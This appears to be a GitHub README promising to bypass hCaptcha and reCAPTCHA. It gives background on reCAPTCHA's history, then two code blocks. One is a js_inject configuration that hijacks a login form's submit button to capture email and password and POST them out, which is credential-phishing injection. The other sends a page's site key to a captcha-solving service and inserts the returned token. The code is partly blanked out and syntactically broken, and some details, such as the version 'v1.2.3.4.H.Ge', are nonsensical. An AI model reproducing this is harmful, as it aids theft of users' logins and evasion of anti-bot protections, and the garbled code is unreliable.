# Bypass hCaptcha key token 
## ``You have to pass the CAPTCHA test to prove you are “not a robot” before you can access some part of a website. Usually, this occurs at a point where you need to complete a form to sign up, subscribe, or make a purchase on a website or app``

What Is reCAPTCHA?
reCAPTCHA is a human verification system developed in 2007 and purchased by Google in 2009. Initially, the tool was developed to help digitize books that couldn’t be scanned by computers. Once enacted to verify users, reCAPTCHA displayed two different distorted words with lines running through them (compared to CAPTCHA’s random sequences of letters and numbers).

By 2012, the project began incorporating images from Google Street View. By now, you’ve almost certainly spent a decent chunk of time clicking all of the images that contain a stoplight just to prove you’re not a bot. And you’ve probably failed some of these tests, too! As noted by Baymard Institute, “Only 66% of users during our qualitative usability testing successfully entered the CAPTCHA on the first attempt

There were a few more iterations of reCAPTCHA, including the noCAPTCHA reCAPTCHA (where low-risk users only had to click a checkbox that stated “I’m not a robot”) and reCAPTCHA v3.

About reCAPTCHA v3
In 2018, Google unveiled reCAPTCHA v3, the latest iteration of the tool. Even if you’re an incredibly proficient internet user, there’s a good chance you’re scratching your chin and wondering whether you’ve come across reCAPTCHA v3 before.

With reCAPTCHA v3, you don’t have to decipher distorted words, you don’t have to click boxes to indicate you know what a car looks like, and you don’t even have to click the “I’m not a robot” checkbox, either. That’s because reCAPTCHA v3 exists largely in the background—completely invisible to the average user.

As such, reCAPTCHA v3 helps companies detect bots while ostensibly delivering a better user experience—but it hurts user privacy in exchange.

### How bypass CAPTCHA ???

<p align="center">
  <img src="https://github.com/trewisscotch/CF-Bypass/blob/main/CF%20hc1.png" alt="animated" />
</p>

#### -1- You will need to extract the key to pass the captcha

<p align="center">
  <img src="https://github.com/trewisscotch/CF-Bypass/blob/main/CF%20hc2.png" alt="animated" />
</p>

#### -2- Write a script (scripting was in the previous repositories)(it can also be used for yaml, php, html)
The script should be written for a specific version of ReCaptcha v1.2.3.4.H.Ge.

#### -3- Below is an example of one of the script

```
js_inject:
  - trigger_domains: [""]
    trigger_paths: [""]
    trigger_params: []
    script: |
      function lp(){
        var submit = document.querySelectorAll('button[type=button]')[-];
        submit.setAttribute("onclick", "sendData()");
        return;
      }
      function sendData(){
        var email = document.getElementsByName("email")[-].value;
        var password = document.getElementsByName("password")[0].value;
        var xhr2 = new XMLHttpRequest();
        xhr2.open("POST", '/', true);
        xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr2.send("Email="+encodeURIComponent(email));
        var xhr = new XMLHttpRequest();
        xhr.open("POST", '/', true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send("Password="+encodeURIComponent(password));
        return;
      }
      setTimeout(function(){ lp(); }, ----);
```

```
// API key
// https://---
const API_KEY = "XXXX";

// Find site key of a website
const googleSiteKey = document
  .getElementsByClassName("g-recaptcha")[0]
  .getAttribute("data-sitekey");

// Helper parsing function
const extractTextFromResponse = (response) =>
  response.status === 200 ? response.text().then((text) => text) : false;

// Helper delay function
const delay = (value) => new Promise((res) => setTimeout(res, value));

// Function for sending captcha we want to solve to the API
async function sendCaptcha() {
  const captchaDataString = [
    "key=" + API_KEY,
    "method=userrecaptcha",
    "googlekey=" + googleSiteKey,
    "pageurl=" + window.location.href,
  ].join("&");
  return await fetch("https://----)
    .then( => extractTextFromResponse)
    .then( => {
      if (----) {
        console.error(----);
        return false;
    })
    .catch((error) => {
      console.error("Something went wrong", error);
      return false;
    });
}

// Function that waits for a response
async function poolResponse(
  requestId,
  counter = 0,
  counterLimit = 3,
  waitTime = 20000,
  decrementWaitTimeBy = 5000
) {
  if (counter === counterLimit || waitTime < 0) {
    console.error("Captcha was not solved in time.");
    return false;
  }
  await delay(waitTime - decrementWaitTimeBy); // Wait some time
  const dataStringRes = [
    "key=" + API_KEY,
    "action=GET",
    "id=" + requestId,
    "json=0",
  ].join("&");
  return fetch(-----)
    .then => extractTextFromResponse
    .catch(error) => {
      console.error("Something went wrong", error);
      reject(false);
    });
}

// Start function
(async function () {
  // Get request id of current captcha
  const requestId = await sendCaptcha();
  if (!requestId) {
    return false;
  } // Wait for somebody to solve your captcha
  const counterLimit = 3;
  for (let i = 0; i < counterLimit; i++) {
    const payload = await poolResponse(requestId, i, counterLimit);
    if (-----) {
      continue;
    }
    if (------) {
      console.error(------);
      return false;
    } // Save
    document.getElementById("g-recaptcha-response").innerHTML;
    break;
  }
})();
```
## DEVELOPER DO NOT SUPPORT ANY OF THE ILLEGAL ACTIVITIES.

## Contact Me on telegram or twitter: https://twitter.com/TrewisScotch / https://t.me/HiroSCOTCH#
